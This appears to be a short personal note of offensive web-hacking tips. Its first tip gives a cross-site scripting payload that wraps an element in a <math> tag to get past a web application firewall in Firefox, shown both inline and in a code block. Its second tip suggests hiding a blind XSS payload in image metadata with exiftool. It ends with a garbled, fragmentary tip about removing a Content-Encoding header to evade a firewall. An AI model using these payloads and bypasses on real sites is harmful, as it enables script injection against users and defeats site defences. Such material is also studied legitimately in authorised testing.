<mark style="background: #FF5582A6;">Tip 1:</mark>
Don't forget about the `<math>` element for XSS WAF bypass on Firefox browser. <math> <xss href="javascript:alert(31337)"> Click Me </xss> </math> The `<math>` can make any HTML element clickable within it.
```
<math> <xss href="javascript:alert(31337)"> Click Me </xss> </math>
```

The `<math>` can make any HTML element clickable within it.

<mark style="background: #FF5582A6;">Tip 2:</mark>
Add blind xss payload in image comment using exiftool

-> remove Content-Encoding:  firewall -> header to bypass WAF